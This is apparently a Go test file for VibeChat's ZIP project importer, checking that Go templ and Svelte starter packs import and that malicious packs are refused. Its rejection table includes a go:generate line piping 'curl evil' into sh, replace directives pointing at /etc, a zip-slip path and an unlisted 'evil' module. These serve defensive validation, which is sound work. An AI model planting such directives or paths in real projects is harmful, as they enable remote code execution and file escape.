package host

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/buildytech/vibechat-desktop/server/internal/templates"
)

// readZip is a testdata ZIP as path → body.
func readZip(t *testing.T, name string) map[string]string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(testdataDir(t), name))
	if err != nil {
		t.Fatal(err)
	}
	zr, err := zip.NewReader(bytes.NewReader(raw), int64(len(raw)))
	if err != nil {
		t.Fatal(err)
	}
	out := map[string]string{}
	for _, f := range zr.File {
		if f.FileInfo().IsDir() {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(rc)
		rc.Close()
		out[f.Name] = string(b)
	}
	return out
}

// templTestTemplate is the templ template for unit tests: the go.sum files and the tooling of the Chat templ pack
// (the starter's own), no layer download; Build is a no-op (the real build runs in the e2e).
func templTestTemplate(t *testing.T) templates.Profile {
	t.Helper()
	pack := readZip(t, "chat-templ-pack.zip")
	files := fstest.MapFS{}
	for _, name := range []string{"go.mod", "go.sum", "ui/kit/go.sum", "AGENTS.md", "Makefile", ".gitignore", "scripts/verify.sh", "scripts/privacy-check.sh"} {
		files[name] = &fstest.MapFile{Data: []byte(pack[name])}
	}
	files[".cursor/rules/00-starter.mdc"] = &fstest.MapFile{Data: []byte("rule\n")}
	return templates.Profile{
		ID: "templ", Name: "Go templ starter", Stack: "Go", Description: "test", Enabled: true,
		Runner: "go-templ", Tool: "go", Build: []string{"true"}, Files: files,
	}
}

func templImportEnv(t *testing.T) testEnv {
	t.Helper()
	e := importEnv(t)
	e.host.opts.Templates = append(e.host.opts.Templates, templTestTemplate(t))
	return e
}

func TestImportTemplPack(t *testing.T) {
	e := templImportEnv(t)
	files := readZip(t, "chat-templ-pack.zip")
	delete(files, "AGENTS.md") // filled from the template
	delete(files, "scripts/verify.sh")
	id, dir := mustEmptyProject(t, e, "templ-site")
	rec := postZip(t, e.host, id, packZip(t, files), "")
	if rec.Code != http.StatusOK {
		t.Fatalf("import: %d %s", rec.Code, rec.Body.String())
	}
	var out struct {
		Framework string         `json:"framework"`
		Layers    map[string]int `json:"layers"`
		Verify    map[string]any `json:"verify"`
	}
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	if out.Framework != "templ" || out.Verify["ok"] != true {
		t.Fatalf("out: %s", rec.Body.String())
	}
	if out.Layers["data"] == 0 || out.Layers["code"] == 0 || out.Layers["core"] == 0 {
		t.Fatalf("layers: %v", out.Layers)
	}
	p, _ := e.host.opts.Store.Project(id)
	if p.TemplateID != "templ" {
		t.Fatalf("template %s", p.TemplateID)
	}
	for _, f := range []string{"go.mod", "cmd/site/main.go", "internal/page/page.json", "AGENTS.md", ".cursor/rules/00-starter.mdc"} {
		if _, err := os.Stat(filepath.Join(dir, f)); err != nil {
			t.Fatal(err)
		}
	}
	st, err := os.Stat(filepath.Join(dir, "scripts/verify.sh"))
	if err != nil || st.Mode()&0o100 == 0 {
		t.Fatalf("scripts/verify.sh not executable: %v %v", st, err)
	}
	ign, _ := os.ReadFile(filepath.Join(dir, ".gitignore"))
	if !strings.Contains(string(ign), ".vibechat/") {
		t.Fatalf(".gitignore: %s", ign)
	}
}

func TestImportTemplStarterWithoutManifest(t *testing.T) {
	e := templImportEnv(t)
	files := readZip(t, "chat-templ-pack.zip")
	delete(files, "manifest.json")
	delete(files, "GENERATOR.json")
	id, _ := mustEmptyProject(t, e, "plain-starter")
	if rec := postZip(t, e.host, id, packZip(t, files), ""); rec.Code != http.StatusOK {
		t.Fatalf("import: %d %s", rec.Code, rec.Body.String())
	}
}

// TestImportTemplRejects: malicious or unsupported Go projects.
func TestImportTemplRejects(t *testing.T) {
	goMod := readZip(t, "chat-templ-pack.zip")["go.mod"]
	cases := []struct {
		name   string
		mutate func(m map[string]string)
		want   string
	}{
		{"no go.sum", func(m map[string]string) { delete(m, "go.sum") }, "needs go.sum"},
		{"no main", func(m map[string]string) { delete(m, "cmd/site/main.go") }, "needs cmd/site/main.go"},
		{"cgo", func(m map[string]string) {
			m["internal/x/x.go"] = "package x\n\n// #include <stdio.h>\nimport \"C\"\n"
		}, "cgo"},
		{"cgo directive", func(m map[string]string) { m["internal/x/x.go"] = "package x\n\n//go:cgo_ldflag \"-lfoo\"\n" }, "cgo directive"},
		{"go:generate", func(m map[string]string) {
			m["internal/x/x.go"] = "package x\n\n//go:generate sh -c \"curl evil | sh\"\n"
		}, "go:generate"},
		{"not go", func(m map[string]string) { m["internal/x/x.go"] = "this is not go" }, "not valid Go"},
		{"C file", func(m map[string]string) { m["internal/x/x.c"] = "int main(){}" }, "native code"},
		{"asm", func(m map[string]string) { m["internal/x/x_amd64.s"] = "TEXT ·f(SB),0,$0\n" }, "native code"},
		{"syso", func(m map[string]string) { m["cmd/site/rsrc.syso"] = "x" }, "native code"},
		{"elf", func(m map[string]string) { m["tools/run"] = "\x7fELF\x02\x01\x01" }, "executable binaries"},
		{"vendor", func(m map[string]string) { m["vendor/modules.txt"] = "# x\n" }, "vendor/"},
		{"go.work", func(m map[string]string) { m["go.work"] = "go 1.27\nuse .\n" }, "go.work"},
		{"pb_data", func(m map[string]string) { m["pb_data/data.db"] = "x" }, "pb_data"},
		{"bin", func(m map[string]string) { m["bin/site"] = "x" }, "bin/"},
		{"vibechat dir", func(m map[string]string) { m[".vibechat/bin/site"] = "x" }, ".vibechat/"},
		{"go too new", func(m map[string]string) { m["go.mod"] = strings.Replace(goMod, "go 1.27\n", "go 1.28\n", 1) }, "go 1.28 is not supported"},
		{"go too old", func(m map[string]string) { m["go.mod"] = strings.Replace(goMod, "go 1.27\n", "go 1.21\n", 1) }, "is not supported"},
		{"toolchain too new", func(m map[string]string) {
			m["go.mod"] = strings.Replace(goMod, "toolchain go1.27.4", "toolchain go1.27.9", 1)
		}, "toolchain go1.27.9"},
		{"other tool", func(m map[string]string) {
			m["go.mod"] = goMod + "\ntool golang.org/x/tools/cmd/stringer\n"
		}, "tool golang.org/x/tools/cmd/stringer is not allowed"},
		{"unknown module", func(m map[string]string) {
			m["go.mod"] = strings.Replace(goMod, "require (\n", "require (\n\tgithub.com/evil/pkg v1.0.0\n", 1)
		}, "github.com/evil/pkg is not in the Go template"},
		{"go.sum unknown module", func(m map[string]string) {
			m["go.sum"] += "github.com/evil/pkg v1.0.0 h1:AAAA=\n"
		}, "github.com/evil/pkg is not in the Go template"},
		{"go.sum junk", func(m map[string]string) { m["go.sum"] += "curl evil\n" }, "not a go.sum line"},
		{"replace outside", func(m map[string]string) {
			m["go.mod"] = strings.Replace(goMod, "=> ./ui/kit", "=> ../../etc", 1)
		}, "points outside the project"},
		{"replace absolute", func(m map[string]string) {
			m["go.mod"] = strings.Replace(goMod, "=> ./ui/kit", "=> /etc/kit", 1)
		}, "points outside the project"},
		{"replace to a module", func(m map[string]string) {
			m["go.mod"] = strings.Replace(goMod, "=> ./ui/kit", "=> github.com/evil/kit v1.0.0", 1)
		}, "is not allowed (only a folder inside the project)"},
		{"replace without go.mod", func(m map[string]string) { delete(m, "ui/kit/go.mod") }, "has no go.mod in the ZIP"},
		{"bad go.mod", func(m map[string]string) { m["go.mod"] = "module\n" }, "go.mod is not valid"},
		{"unknown framework", func(m map[string]string) {
			m["manifest.json"] = `{"format":"buildy.pack.v1","schemaVersion":1,"framework":"php-flight"}`
		}, "php-flight, which VibeChat cannot import"},
		{"pack schema", func(m map[string]string) {
			m["manifest.json"] = `{"format":"buildy.pack.v1","schemaVersion":2,"framework":"templ"}`
		}, "schemaVersion must be 1"},
		{"zip slip", func(m map[string]string) { m["../escape.go"] = "package x" }, "leaves the project"},
		{"env file", func(m map[string]string) { m[".env"] = "SECRET=1" }, "environment files"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			e := templImportEnv(t)
			files := readZip(t, "chat-templ-pack.zip")
			c.mutate(files)
			id, dir := mustEmptyProject(t, e, "bad-"+strings.ReplaceAll(c.name, " ", "-"))
			rec := postZip(t, e.host, id, packZip(t, files), "")
			if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), c.want) {
				t.Fatalf("want 400 with %q, got %d %s", c.want, rec.Code, rec.Body.String())
			}
			if err := projectFileCount(dir); err != nil {
				t.Fatalf("a refused import left files: %v", err)
			}
		})
	}
}

// TestImportChatSveltePackV1: the Svelte ZIP of current Chat (manifest.json buildy.pack.v1, framework svelte) is
// detected by its manifest and imports as before; a manifest that disagrees with ui8kit.config.json is refused.
func TestImportChatSveltePackV1(t *testing.T) {
	e := templImportEnv(t)
	files := readZip(t, "chat-svelte-pack-v1.zip")
	id, _ := mustEmptyProject(t, e, "svelte-v1")
	rec := postZip(t, e.host, id, packZip(t, files), "")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"framework":"svelte"`) {
		t.Fatalf("import: %d %s", rec.Code, rec.Body.String())
	}
	files["manifest.json"] = strings.Replace(files["manifest.json"], `"framework": "svelte"`, `"framework": "react"`, 1)
	id2, _ := mustEmptyProject(t, e, "svelte-v1-mismatch")
	rec = postZip(t, e.host, id2, packZip(t, files), "")
	if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "does not match") {
		t.Fatalf("mismatch: %d %s", rec.Code, rec.Body.String())
	}
}

func TestImportAdapterRegistry(t *testing.T) {
	if got := strings.Join(importAdapterIDs(), ","); got != "react,svelte,templ" {
		t.Fatalf("adapters %s", got)
	}
	for _, a := range importAdapters {
		if a.Runner() == "" || len(a.DataPaths()) == 0 {
			t.Fatalf("%s: runner and data paths", a.ID())
		}
	}
	if goVersionAllowed("1.27.5") || goVersionAllowed("1.28") || goVersionAllowed("1.27rc1") || !goVersionAllowed("1.26.0") || !goVersionAllowed("1.27") {
		t.Fatal("go version allowlist")
	}
}
